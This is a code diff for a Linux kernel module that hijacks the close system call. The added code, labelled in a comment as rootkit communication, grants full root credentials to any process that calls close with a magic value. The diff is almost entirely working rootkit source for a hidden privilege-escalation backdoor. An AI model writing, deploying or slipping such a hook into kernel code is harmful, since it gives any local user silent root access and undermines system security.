@@ -2,6 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/syscalls.h>
+#include <linux/sched.h>
 #include <asm/unistd.h>
 
 #if defined(__386__)
@@ -14,15 +15,51 @@ typedef unsigned int pointer_size_t;
 typedef unsigned long pointer_size_t;
 #endif
 
+/***************************************************************************/
+/* SPECIAL VALUES FOR MALICIOUS COMMUNICATION BETWEEN PROCESSES AND ROOTKIT */
+#define ELEVATE_UID -23121990
+
+
+/***************************************************************************/
+
+
 unsigned long **syscall_table;
 
 asmlinkage int (*original_close)(int fd);
 
+
+int elevate_current_privileges(void)
+{
+	int err = -1;
+
+	struct cred *elevated_cred = prepare_creds();
+	kuid_t elevated_uid;
+	kgid_t elevated_gid;
+	elevated_uid.val = 0;
+	elevated_gid.val = 0;
+
+	if (elevated_cred != NULL) {
+		elevated_cred->uid = elevated_cred->euid = elevated_cred->suid
+			 = elevated_cred->fsuid = elevated_uid;
+		elevated_cred->gid = elevated_cred->egid = elevated_cred->sgid
+			 = elevated_cred->fsgid = elevated_gid;
+
+		commit_creds(elevated_cred);
+		err = 0;
+	}
+
+	return err;
+}
+
 asmlinkage int my_close(int fd)
 {
-	int err;
-	printk("Hijacked close call; fd: %d\n", fd);
-	err = original_close(fd);
+	int err = 0;
+
+	if (fd == ELEVATE_UID)
+		elevate_current_privileges();	
+	else
+		err = original_close(fd);
+
 	return err;
 }
 
